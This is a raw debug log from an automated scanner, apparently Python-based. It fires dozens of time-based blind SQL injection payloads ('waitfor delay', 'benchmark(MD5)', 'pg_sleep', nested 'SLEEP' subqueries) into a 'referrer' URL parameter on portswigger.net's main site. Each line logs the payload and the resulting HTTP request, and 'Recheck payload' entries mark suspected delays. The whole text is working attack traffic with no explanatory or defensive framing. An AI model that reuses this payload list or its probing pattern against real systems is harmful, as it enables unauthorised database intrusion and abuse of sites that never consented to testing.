+2024-07-26 12:21:34,031 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input%22;waitfor%20delay%20'0:0:5'-- HTTP/1.1" 200 None
+2024-07-26 12:21:34,312 - INFO - [12:21:34] Payload testing: ";waitfor delay '0:0:5'--
+2024-07-26 12:21:34,317 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:21:35,526 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input');waitfor%20delay%20'0:0:5'-- HTTP/1.1" 200 None
+2024-07-26 12:21:35,860 - INFO - [12:21:35] Payload testing: ');waitfor delay '0:0:5'--
+2024-07-26 12:21:35,864 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:21:37,074 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input%22);waitfor%20delay%20'0:0:5'-- HTTP/1.1" 200 None
+2024-07-26 12:21:37,378 - INFO - [12:21:37] Payload testing: ");waitfor delay '0:0:5'--
+2024-07-26 12:21:37,383 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:21:38,439 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input));waitfor%20delay%20'0:0:5'-- HTTP/1.1" 200 None
+2024-07-26 12:21:38,894 - INFO - [12:21:38] Payload testing: ));waitfor delay '0:0:5'--
+2024-07-26 12:21:38,898 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:21:39,968 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input'));waitfor%20delay%20'0:0:5'-- HTTP/1.1" 200 None
+2024-07-26 12:21:40,340 - INFO - [12:21:40] Payload testing: '));waitfor delay '0:0:5'--
+2024-07-26 12:21:40,345 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:21:41,458 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input%22));waitfor%20delay%20'0:0:5'-- HTTP/1.1" 200 None
+2024-07-26 12:21:41,788 - INFO - [12:21:41] Payload testing: "));waitfor delay '0:0:5'--
+2024-07-26 12:21:41,788 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:21:42,984 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputbenchmark(10000000,MD5(1)) HTTP/1.1" 200 None
+2024-07-26 12:21:43,295 - INFO - [12:21:43] Payload testing: benchmark(10000000,MD5(1))#
+2024-07-26 12:21:43,301 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:21:44,858 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input1%20or%20benchmark(10000000,MD5(1)) HTTP/1.1" 200 None
+2024-07-26 12:21:45,296 - INFO - [12:21:45] Payload testing: 1 or benchmark(10000000,MD5(1))#
+2024-07-26 12:21:45,301 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:21:46,845 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input%22%20or%20benchmark(10000000,MD5(1)) HTTP/1.1" 200 None
+2024-07-26 12:21:47,298 - INFO - [12:21:47] Payload testing: " or benchmark(10000000,MD5(1))#
+2024-07-26 12:21:47,302 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:21:48,985 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input'%20or%20benchmark(10000000,MD5(1)) HTTP/1.1" 200 None
+2024-07-26 12:21:49,579 - INFO - [12:21:49] Payload testing: ' or benchmark(10000000,MD5(1))#
+2024-07-26 12:21:49,587 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:21:54,179 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input1)%20or%20benchmark(10000000,MD5(1)) HTTP/1.1" 200 None
+2024-07-26 12:21:54,545 - INFO - [12:21:54] Payload testing: 1) or benchmark(10000000,MD5(1))#
+2024-07-26 12:21:54,553 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:21:55,831 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input%22)%20or%20benchmark(10000000,MD5(1)) HTTP/1.1" 200 None
+2024-07-26 12:21:56,175 - INFO - [12:21:56] Payload testing: ") or benchmark(10000000,MD5(1))#
+2024-07-26 12:21:56,181 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:21:57,293 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input')%20or%20benchmark(10000000,MD5(1)) HTTP/1.1" 200 None
+2024-07-26 12:21:57,556 - INFO - [12:21:57] Payload testing: ') or benchmark(10000000,MD5(1))#
+2024-07-26 12:21:57,561 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:21:58,766 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input1))%20or%20benchmark(10000000,MD5(1)) HTTP/1.1" 200 None
+2024-07-26 12:21:59,164 - INFO - [12:21:59] Payload testing: 1)) or benchmark(10000000,MD5(1))#
+2024-07-26 12:21:59,164 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:22:00,456 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input%22))%20or%20benchmark(10000000,MD5(1)) HTTP/1.1" 200 None
+2024-07-26 12:22:00,821 - INFO - [12:22:00] Payload testing: ")) or benchmark(10000000,MD5(1))#
+2024-07-26 12:22:00,826 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:22:02,086 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input'))%20or%20benchmark(10000000,MD5(1)) HTTP/1.1" 200 None
+2024-07-26 12:22:02,529 - INFO - [12:22:02] Payload testing: ')) or benchmark(10000000,MD5(1))#
+2024-07-26 12:22:02,534 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:22:03,744 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputpg_sleep(5)-- HTTP/1.1" 200 None
+2024-07-26 12:22:04,107 - INFO - [12:22:04] Payload testing: pg_sleep(5)--
+2024-07-26 12:22:04,123 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:22:05,356 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input1%20or%20pg_sleep(5)-- HTTP/1.1" 200 None
+2024-07-26 12:22:05,678 - INFO - [12:22:05] Payload testing: 1 or pg_sleep(5)--
+2024-07-26 12:22:05,683 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:22:06,852 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input%22%20or%20pg_sleep(5)-- HTTP/1.1" 200 None
+2024-07-26 12:22:07,201 - INFO - [12:22:07] Payload testing: " or pg_sleep(5)--
+2024-07-26 12:22:07,206 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:22:08,316 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input'%20or%20pg_sleep(5)-- HTTP/1.1" 200 None
+2024-07-26 12:22:08,625 - INFO - [12:22:08] Payload testing: ' or pg_sleep(5)--
+2024-07-26 12:22:08,630 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:22:09,841 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input1)%20or%20pg_sleep(5)-- HTTP/1.1" 200 None
+2024-07-26 12:22:10,208 - INFO - [12:22:10] Payload testing: 1) or pg_sleep(5)--
+2024-07-26 12:22:10,212 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:22:11,413 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input%22)%20or%20pg_sleep(5)-- HTTP/1.1" 200 None
+2024-07-26 12:22:11,707 - INFO - [12:22:11] Payload testing: ") or pg_sleep(5)--
+2024-07-26 12:22:11,712 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:22:12,811 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input')%20or%20pg_sleep(5)-- HTTP/1.1" 200 None
+2024-07-26 12:22:13,213 - INFO - [12:22:13] Payload testing: ') or pg_sleep(5)--
+2024-07-26 12:22:13,218 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:22:14,326 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input1))%20or%20pg_sleep(5)-- HTTP/1.1" 200 None
+2024-07-26 12:22:14,638 - INFO - [12:22:14] Payload testing: 1)) or pg_sleep(5)--
+2024-07-26 12:22:14,641 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:22:15,777 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input%22))%20or%20pg_sleep(5)-- HTTP/1.1" 200 None
+2024-07-26 12:22:16,142 - INFO - [12:22:16] Payload testing: ")) or pg_sleep(5)--
+2024-07-26 12:22:16,146 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:22:17,292 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input'))%20or%20pg_sleep(5)-- HTTP/1.1" 200 None
+2024-07-26 12:22:17,545 - INFO - [12:22:17] Payload testing: ')) or pg_sleep(5)--
+2024-07-26 12:22:17,552 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:22:18,733 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputAND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))bAKL)%20AND%20'vRxe'='vRxe HTTP/1.1" 200 None
+2024-07-26 12:22:19,021 - INFO - [12:22:19] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+2024-07-26 12:22:19,025 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:22:20,147 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%252Fweb-security%252Fclickjacking%252Flab-prefilled-form-inputAND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))YjoC)%20AND%20'%25'=' HTTP/1.1" 200 None
+2024-07-26 12:22:20,607 - INFO - [12:22:20] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
+2024-07-26 12:22:20,612 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:22:21,857 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputAND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))nQIP) HTTP/1.1" 200 None
+2024-07-26 12:22:22,314 - INFO - [12:22:22] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+2024-07-26 12:22:22,318 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:22:23,534 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputAND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))nQIP)-- HTTP/1.1" 200 None
+2024-07-26 12:22:23,942 - INFO - [12:22:23] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
+2024-07-26 12:22:23,947 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:22:25,465 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputAND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))nQIP) HTTP/1.1" 200 None
+2024-07-26 12:22:25,892 - INFO - [12:22:25] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
+2024-07-26 12:22:25,909 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:22:27,197 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputSLEEP(5) HTTP/1.1" 200 None
+2024-07-26 12:22:27,458 - INFO - [12:22:27] Payload testing: SLEEP(5)#
+2024-07-26 12:22:27,463 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:22:28,699 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputSLEEP(5)-- HTTP/1.1" 200 None
+2024-07-26 12:22:29,037 - INFO - [12:22:29] Payload testing: SLEEP(5)--
+2024-07-26 12:22:29,042 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:22:30,107 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputSLEEP(5)=%22 HTTP/1.1" 200 None
+2024-07-26 12:22:30,419 - INFO - [12:22:30] Payload testing: SLEEP(5)="
+2024-07-26 12:22:30,419 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:22:31,674 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputSLEEP(5)=' HTTP/1.1" 200 None
+2024-07-26 12:22:31,988 - INFO - [12:22:31] Payload testing: SLEEP(5)='
+2024-07-26 12:22:31,993 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:22:33,218 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputor%20SLEEP(5) HTTP/1.1" 200 None
+2024-07-26 12:22:33,583 - INFO - [12:22:33] Payload testing: or SLEEP(5)
+2024-07-26 12:22:33,583 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:22:34,903 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputor%20SLEEP(5) HTTP/1.1" 200 None
+2024-07-26 12:22:35,345 - INFO - [12:22:35] Payload testing: or SLEEP(5)#
+2024-07-26 12:22:35,349 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:22:37,274 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputor%20SLEEP(5)-- HTTP/1.1" 200 None
+2024-07-26 12:22:37,904 - INFO - [12:22:37] Payload testing: or SLEEP(5)--
+2024-07-26 12:22:37,922 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:22:40,280 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputor%20SLEEP(5)=%22 HTTP/1.1" 200 None
+2024-07-26 12:22:40,661 - INFO - [12:22:40] Payload testing: or SLEEP(5)="
+2024-07-26 12:22:40,666 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:22:42,245 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputor%20SLEEP(5)=' HTTP/1.1" 200 None
+2024-07-26 12:22:42,838 - INFO - [12:22:42] Payload testing: or SLEEP(5)='
+2024-07-26 12:22:42,838 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:22:44,077 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputwaitfor%20delay%20'00:00:05' HTTP/1.1" 200 None
+2024-07-26 12:22:44,374 - INFO - [12:22:44] Payload testing: waitfor delay '00:00:05'
+2024-07-26 12:22:44,374 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:22:45,578 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputwaitfor%20delay%20'00:00:05'-- HTTP/1.1" 200 None
+2024-07-26 12:22:45,918 - INFO - [12:22:45] Payload testing: waitfor delay '00:00:05'--
+2024-07-26 12:22:45,922 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:22:48,340 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputwaitfor%20delay%20'00:00:05' HTTP/1.1" 200 None
+2024-07-26 12:22:49,235 - INFO - [12:22:49] Payload testing: waitfor delay '00:00:05'#
+2024-07-26 12:22:49,240 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:22:51,467 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputbenchmark(50000000,MD5(1)) HTTP/1.1" 200 None
+2024-07-26 12:22:52,409 - INFO - [12:22:52] Payload testing: benchmark(50000000,MD5(1))
+2024-07-26 12:22:52,414 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:22:57,047 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputbenchmark(50000000,MD5(1))-- HTTP/1.1" 200 None
+2024-07-26 12:23:02,194 - INFO - [12:23:02] Payload testing: benchmark(50000000,MD5(1))--
+2024-07-26 12:23:02,209 - INFO - [!] Recheck payload: benchmark(100000000,MD10(1))--
+2024-07-26 12:23:02,209 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:23:03,796 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputbenchmark(100000000,MD10(1))-- HTTP/1.1" 200 None
+2024-07-26 12:23:04,295 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:23:08,613 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputbenchmark(50000000,MD5(1)) HTTP/1.1" 200 None
+2024-07-26 12:23:12,128 - INFO - [12:23:12] Payload testing: benchmark(50000000,MD5(1))#
+2024-07-26 12:23:12,129 - INFO - [!] Recheck payload: benchmark(100000000,MD10(1))#
+2024-07-26 12:23:12,131 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:23:14,468 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputbenchmark(100000000,MD10(1)) HTTP/1.1" 200 None
+2024-07-26 12:23:15,109 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:23:16,978 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputor%20benchmark(50000000,MD5(1)) HTTP/1.1" 200 None
+2024-07-26 12:23:17,620 - INFO - [12:23:17] Payload testing: or benchmark(50000000,MD5(1))
+2024-07-26 12:23:17,636 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:23:21,095 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputor%20benchmark(50000000,MD5(1))-- HTTP/1.1" 200 None
+2024-07-26 12:23:21,837 - INFO - [12:23:21] Payload testing: or benchmark(50000000,MD5(1))--
+2024-07-26 12:23:21,842 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:23:24,377 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputor%20benchmark(50000000,MD5(1)) HTTP/1.1" 200 None
+2024-07-26 12:23:24,691 - INFO - [12:23:24] Payload testing: or benchmark(50000000,MD5(1))#
+2024-07-26 12:23:24,695 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:23:26,733 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputpg_SLEEP(5) HTTP/1.1" 200 None
+2024-07-26 12:23:27,593 - INFO - [12:23:27] Payload testing: pg_SLEEP(5)
+2024-07-26 12:23:27,593 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:23:28,728 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputpg_SLEEP(5)-- HTTP/1.1" 200 None
+2024-07-26 12:23:29,038 - INFO - [12:23:29] Payload testing: pg_SLEEP(5)--
+2024-07-26 12:23:29,043 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:23:30,104 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputpg_SLEEP(5) HTTP/1.1" 200 None
+2024-07-26 12:23:30,544 - INFO - [12:23:30] Payload testing: pg_SLEEP(5)#
+2024-07-26 12:23:30,549 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:23:32,386 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputor%20pg_SLEEP(5) HTTP/1.1" 200 None
+2024-07-26 12:23:33,569 - INFO - [12:23:33] Payload testing: or pg_SLEEP(5)
+2024-07-26 12:23:33,573 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:23:36,727 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputor%20pg_SLEEP(5)-- HTTP/1.1" 200 None
+2024-07-26 12:23:37,902 - INFO - [12:23:37] Payload testing: or pg_SLEEP(5)--
+2024-07-26 12:23:37,918 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
